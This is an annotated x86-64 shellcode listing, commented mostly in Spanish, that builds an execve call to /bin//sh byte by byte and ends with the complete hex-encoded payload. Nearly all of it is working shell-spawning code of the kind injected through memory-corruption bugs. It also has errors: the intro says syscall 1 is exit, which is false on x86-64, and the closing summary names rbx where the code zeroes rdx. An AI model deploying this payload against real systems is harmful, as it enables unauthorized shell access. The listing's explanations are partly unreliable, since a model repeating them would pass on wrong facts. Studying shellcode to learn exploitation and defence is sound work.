When calling syscall, %rax holds the syscall number which will determine
what you want to happen at the call (1 is exit, 59 is execve, etc) and
then the subsequent arguments go into %rdi, %rsi and %rdx.


; execve("/bin//sh", ["/bin//sh", NULL], NULL)

# Aqui hacemos que rax = 0x3b -> syscall de execve
mov al, 0x3b                    # b0 3b

# Ponemos rdx a 0 (con un byte :D) lo necesitaremos para los NULL bytes
# Fin de cadenas y demas argumentos de execve
cdq                             # 99

# Guardamos la cadena /bin//sh en un registro.
# Dejamos un NULL en el stack y el path del comando
mov rbx, 0x68732f2f6e69622f     # 48 bb 2f 62 69 6e 2f 2f 73 68
push rdx                        # 52
push rbx                        # 53

# El primer parametro que necesitamos es rdi que apunte a /bin//sh + un NULL 
# para fin de cadena. Esto es equivalente a "mov rdi, rsp" pero con menos bytes.
push rsp                        # 54
pop rdi                         # 5f

# Pusheamos el ultimo 0 de ["/bin//sh", NULL]
# Pusheamos la direccion de la cadena de /bin//sh + NULL
# Y Pusheamos el equivalente de "mov rsi, rsp"
push rdx                        # 52
push rdi                        # 57
push rsp                        # 54
pop rsi                         # 5e

# Ya tenemos todo:
#   · rdi: Puntero a cadena "/bin//sh" + NULL
#   · rsi: Puntero a [puntero de cadena + NULL, NULL]
#   · rbx: NULL
# Hacemos la syscall

syscall                         # 0f 05

b03b9948bb2f62696e2f2f73685253545f5257545e0f05